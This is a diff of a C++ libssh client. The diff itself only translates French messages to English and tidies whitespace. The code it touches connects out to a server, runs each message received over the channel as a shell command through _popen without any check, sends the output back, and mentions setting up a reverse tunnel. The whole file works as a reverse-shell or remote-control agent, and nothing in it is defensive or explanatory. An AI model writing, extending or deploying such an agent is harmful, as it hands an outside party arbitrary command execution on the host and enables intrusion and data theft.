@@ -1,18 +1,18 @@
-#include "ssh_client.h"
+#include <ssh_client.h>
 #include <libssh/libssh.h>
 #include <iostream>
 #include <stdexcept>
 #include <cstring>
 #include <cstdio> 
 #include <memory> 
-#include <sstream> 
+#include <sstream>
 #include <vector>
 
 std::string execute_command(const char* command) {
     std::stringstream output_stream;
     FILE* pipe = _popen(command, "r");
     if (!pipe) {
-        throw std::runtime_error("Erreur lors de l'exécution de la commande.");
+        throw std::runtime_error("Error executing the command.");
     }
     char buffer[128];
     while (!feof(pipe)) {
@@ -46,7 +46,7 @@ std::string ssh_client(const char* server_address, int server_port, const char* 
     int authResult = ssh_connect(sshSession);
     if (authResult != SSH_OK) {
         ssh_free(sshSession); 
-        ssh_finalize(); 
+        ssh_finalize();
         throw std::runtime_error("Failed to connect to SSH server.");
     }
 
@@ -62,13 +62,13 @@ std::string ssh_client(const char* server_address, int server_port, const char* 
     if (!channel) {
         ssh_disconnect(sshSession); 
         ssh_free(sshSession); 
-        ssh_finalize(); 
+        ssh_finalize();
         throw std::runtime_error("Failed to create SSH channel.");
     }
 
     authResult = ssh_channel_open_session(channel);
     if (authResult != SSH_OK) {
-        ssh_channel_free(channel); 
+        ssh_channel_free(channel);
         ssh_disconnect(sshSession); 
         ssh_free(sshSession); 
         ssh_finalize(); 
@@ -80,13 +80,13 @@ std::string ssh_client(const char* server_address, int server_port, const char* 
     char buffer[1024];
     int nbytes;
     while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
-        std::cout << "Commande reçue : " << std::string(buffer, nbytes) << std::endl;
+        std::cout << "Received Command: " << std::string(buffer, nbytes) << std::endl;
 
         if (std::strncmp(buffer, "exit", 4) == 0) {
-            std::cout << "Déconnexion demandée par le serveur." << std::endl;
+            std::cout << "Server requested disconnection." << std::endl;
             break;
         } else if (std::strncmp(buffer, "tunnel", 6) == 0) {
-            std::cout << "Commande de tunnel reçue. Établissement du reverse tunnel." << std::endl;
+            std::cout << "Tunnel command received. Establishing reverse tunnel." << std::endl;
         } else {
             std::string command_result = execute_command(buffer);
             ssh_channel_write(channel, command_result.c_str(), command_result.length());
@@ -98,6 +98,7 @@ std::string ssh_client(const char* server_address, int server_port, const char* 
     ssh_channel_free(channel);
     ssh_disconnect(sshSession);
     ssh_free(sshSession);
-
     ssh_finalize();
+
+    return "SSH client executed successfully.";
 }
